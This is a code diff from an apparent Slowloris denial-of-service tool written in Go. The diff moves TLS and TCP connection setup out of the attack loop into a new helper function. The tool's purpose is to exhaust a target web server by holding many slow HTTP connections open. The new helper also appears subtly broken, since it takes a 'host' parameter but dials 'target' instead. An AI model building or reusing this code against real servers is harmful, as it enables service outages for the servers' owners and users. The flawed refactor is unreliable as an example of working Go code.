@@ -95,26 +95,12 @@ func openConnections(target string, num, timeout int, https bool) {
 }
 
 func slowloris(target string, interval, timeout int, https bool) {
-	timeoutDuration := time.Duration(timeout) * time.Second
 
 loop:
 	for {
-		var conn net.Conn
-		var err error
-
-		if https {
-			config := &tls.Config{InsecureSkipVerify: true}
-			conn, err = tls.Dial("tcp", target, config)
-			if err != nil {
-				continue
-			}
-			defer conn.Close()
-		} else {
-			conn, err = net.DialTimeout("tcp", target, timeoutDuration)
-			if err != nil {
-				continue
-			}
-			defer conn.Close()
+		conn, err := openConnection(target, timeout, https)
+		if err != nil {
+			continue
 		}
 
 		if _, err = fmt.Fprintf(conn, "%s %s HTTP/1.1\r\n", method, resource); err != nil {
@@ -136,6 +122,27 @@ loop:
 		}
 	}
 
+}
+
+func openConnection(host string, timeout int, https bool) (net.Conn, error) {
+	var conn net.Conn
+	var err error
+	timeoutDuration := time.Duration(timeout) * time.Second
+
+	if https {
+		config := &tls.Config{InsecureSkipVerify: true}
+		conn, err = tls.Dial("tcp", target, config)
+		if err != nil {
+			return nil, err
+		}
+	} else {
+		conn, err = net.DialTimeout("tcp", target, timeoutDuration)
+		if err != nil {
+			return nil, err
+		}
+	}
+
+	return conn, nil
 }
 
 func createHeader(host string) *http.Header {
